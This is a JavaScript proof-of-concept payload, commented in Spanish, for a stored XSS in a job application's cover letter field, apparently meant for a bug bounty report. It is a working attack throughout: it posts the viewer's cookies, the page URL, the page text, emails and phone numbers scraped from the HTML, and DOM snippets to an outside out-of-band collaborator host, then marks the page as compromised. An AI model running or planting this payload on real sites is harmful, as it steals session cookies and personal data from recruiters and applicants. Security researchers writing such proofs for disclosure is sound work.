// PoC máximo impacto - Stored XSS en Cover Letter
fetch('https://d4n.4ns9654qtq8sf06wemm5nu1mvd16pydn.oastify.com/', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({
    bug: "Stored XSS in Cover Letter - Critical Impact",
    executed_at: new Date().toISOString(),
    victim_url: location.href,
    page_title: document.title,
    cookies: document.cookie,
    // 1. Todo el texto visible que ve el "reclutador"
    full_visible_text: document.body.innerText.substring(0, 20000),
    // 2. Emails y teléfonos extraídos automáticamente
    emails_found: (document.body.innerHTML.match(/[\w.-]+@[\w.-]+\.\w+/g) || []).join(' | '),
    phones_found: (document.body.innerHTML.match(/[\+]?[\d\s\-\(\)]{8,20}/g) || []).join(' | '),
    // 3. Parte del DOM para confirmar contexto
    html_head: document.head.innerHTML.substring(0, 2000),
    body_snippet: document.body.innerHTML.substring(0, 8000),
    // 4. Prueba visual sutil (no intrusiva)
    proof_of_execution: "XSS_EXECUTED_" + Date.now()
  })
});

// Prueba visual opcional: cambia ligeramente la página sin romperla
// (el triage ve que controlas el DOM completamente)
document.title = "[XSS PoC] " + document.title;
if (document.body) {
  var marker = document.createElement('div');
  marker.style.position = 'fixed';
  marker.style.bottom = '10px';
  marker.style.right = '10px';
  marker.style.background = 'red';
  marker.style.color = 'white';
  marker.style.padding = '10px';
  marker.style.zIndex = '9999';
  marker.textContent = 'XSS PoC - JS remoto ejecutado';
  document.body.appendChild(marker);
}
